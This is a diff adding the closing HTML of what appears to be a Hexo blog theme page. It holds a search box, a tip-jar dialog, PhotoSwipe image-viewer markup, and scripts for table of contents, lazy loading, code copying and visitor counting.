+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+  </div>
+</body>
+
+</html>
